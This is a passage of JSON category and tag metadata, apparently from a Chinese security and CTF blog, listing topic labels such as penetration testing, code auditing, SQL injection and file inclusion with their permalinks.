yz/categories/HackMyVMxxs/"},{"name":"应急响应","slug":"应急响应","permalink":"https://lvzhouhang.xyz/categories/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/"},{"name":"内网渗透","slug":"内网渗透","permalink":"https://lvzhouhang.xyz/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"},{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/categories/ctf/"},{"name":"复盘","slug":"ctf/复盘","permalink":"https://lvzhouhang.xyz/categories/ctf/%E5%A4%8D%E7%9B%98/"},{"name":"代码审计","slug":"代码审计","permalink":"https://lvzhouhang.xyz/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/categories/JAVA/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/categories/web/"},{"name":"java","slug":"web/java","permalink":"https://lvzhouhang.xyz/categories/web/java/"},{"name":"boot2root","slug":"boot2root","permalink":"https://lvzhouhang.xyz/categories/boot2root/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/categories/ctfshow/"},{"name":"刷题","slug":"ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"ctfshow/刷题/php特性","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/php%E7%89%B9%E6%80%A7/"},{"name":"文件包含","slug":"ctfshow/刷题/文件包含","permalink":"https://lvzhouhang.xyz/categories/ctfshow/%E5%88%B7%E9%A2%98/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/categories/BugKu/"},{"name":"刷题","slug":"BugKu/刷题","permalink":"https://lvzhouhang.xyz/categories/BugKu/%E5%88%B7%E9%A2%98/"},{"name":"ctfshow","slug":"web/ctfshow","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/"},{"name":"刷题","slug":"web/ctfshow/刷题","permalink":"https://lvzhouhang.xyz/categories/web/ctfshow/%E5%88%B7%E9%A2%98/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/categories/MISC/"},{"name":"NSSCTF","slug":"MISC/NSSCTF","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/"},{"name":"刷题","slug":"MISC/NSSCTF/刷题","permalink":"https://lvzhouhang.xyz/categories/MISC/NSSCTF/%E5%88%B7%E9%A2%98/"}],"tags":[{"name":"靶机","slug":"靶机","permalink":"https://lvzhouhang.xyz/tags/%E9%9D%B6%E6%9C%BA/"},{"name":"内网","slug":"内网","permalink":"https://lvzhouhang.xyz/tags/%E5%86%85%E7%BD%91/"},{"name":"ctf","slug":"ctf","permalink":"https://lvzhouhang.xyz/tags/ctf/"},{"name":"web","slug":"web","permalink":"https://lvzhouhang.xyz/tags/web/"},{"name":"代码审计","slug":"代码审计","permalink":"https://lvzhouhang.xyz/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"},{"name":"JAVA","slug":"JAVA","permalink":"https://lvzhouhang.xyz/tags/JAVA/"},{"name":"sql","slug":"sql","permalink":"https://lvzhouhang.xyz/tags/sql/"},{"name":"vulnhub","slug":"vulnhub","permalink":"https://lvzhouhang.xyz/tags/vulnhub/"},{"name":"sql注入","slug":"sql注入","permalink":"https://lvzhouhang.xyz/tags/sql%E6%B3%A8%E5%85%A5/"},{"name":"ctfshow","slug":"ctfshow","permalink":"https://lvzhouhang.xyz/tags/ctfshow/"},{"name":"刷题","slug":"刷题","permalink":"https://lvzhouhang.xyz/tags/%E5%88%B7%E9%A2%98/"},{"name":"php特性","slug":"php特性","permalink":"https://lvzhouhang.xyz/tags/php%E7%89%B9%E6%80%A7/"},{"name":"文件包含","slug":"文件包含","permalink":"https://lvzhouhang.xyz/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"},{"name":"BugKu","slug":"BugKu","permalink":"https://lvzhouhang.xyz/tags/BugKu/"},{"name":"MISC","slug":"MISC","permalink":"https://lvzhouhang.xyz/tags/MISC/"},{"name":"NSSCTF","slug":"NSSCTF","permalink":"https://lvzhouhang.xyz/tags/NSSCTF/"}]}